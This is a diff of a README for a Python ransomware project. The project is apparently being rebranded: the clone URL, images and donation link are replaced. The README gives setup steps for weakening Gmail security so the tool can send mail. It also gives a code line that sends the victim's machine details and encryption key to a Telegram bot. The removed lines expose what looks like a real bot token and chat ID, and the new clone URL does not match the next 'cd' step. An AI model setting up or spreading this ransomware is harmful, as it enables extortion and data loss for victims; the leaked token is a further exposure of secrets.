@@ -1,5 +1,5 @@
 <h1 align='center'>Python Ransomware</h1>
-<p align='center'>Simple Ransomware using Python PyQt5 and Cryptography libraries.
+<p align='center'>Simple Ransomware using Python3 and Cryptography libraries.
 You can make the design you want using the design files.</p>
 
 
@@ -13,7 +13,7 @@ You can make the design you want using the design files.</p>
 
 
 ## YouTube Video
-[<img src="https://img.youtube.com/vi/wGwfdWkOal4/0.jpg" width="50%">](https://www.youtube.com/watch?v=wGwfdWkOal4 "Python File Management")
+[<img src="https://elisendahernandezjanes.com/wp-content/uploads/2017/03/Anonymous.jpg" width="50%">](https://www.youtube.com/channel/UCcvI7QSyQ-6IgpSGiErszNg "Python File Management")
 
 ## Getting Started
 
@@ -47,7 +47,7 @@ to be able to send an email<br/>
 >1)open your gmail account<br/>
 >2)go https://myaccount.google.com/<br/>
 >3)Activate "Less secure app access"<br/>
-[<img src="https://img.youtube.com/vi/FVi-m1qmJD0/0.jpg" width="50%">](https://www.youtube.com/watch?v=FVi-m1qmJD0 "Send Email]")
+[<img src="https://img.youtube.com/vi/FVi-m1qmJD0/0.jpg" width="50%">](https://youtu.be/kZnTFUvc1ig "Send Email]")
 
 
 #### 2) Send Telegram (api) Message
@@ -72,8 +72,8 @@ Chat Id<br/>
 
     Send Message Example:
 
-        requests.post("https://api.telegram.org/bot3416572059:AAGB7p9WAe0jWamE89ftR02MR2WgbxlLZEg/sendMessage",
-                data={"chat_id": "3213112048", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})
+        requests.post("https://api.telegram.org/bot<your_telegram_api>g/sendMessage",
+                data={"chat_id": "<your_telegram_chat_id>", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})
 
         requests.post("https://api.telegram.org/bot<your_telegram_api>/sendMessage",
                 data={"chat_id": "<your_telegram_chat_id>", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})
@@ -82,7 +82,7 @@ Chat Id<br/>
 # Installation
 
 ```sh
-$ git clone https://github.com/alii76tt/python_ransomware
+$ git clone https://github.com/networkkiller/killfile
 $ cd python_ransomware
 $ pip install -r requirements.txt
 $ cd Encrypt
@@ -96,5 +96,5 @@ $ python3 decrypt.py
 ## Attention ⚠️
 These scripts contain stuff that can get you in trouble. This is for educational purposes only. Do not abuse.
 
-## Buy Me a Coffee ☕
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/alii76tt)
+## view Me patreon ☕
+[!["follow me for more"](https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Patreon_logomark.svg/1200px-Patreon_logomark.svg.png)](https://www.patreon.com/everyhats)
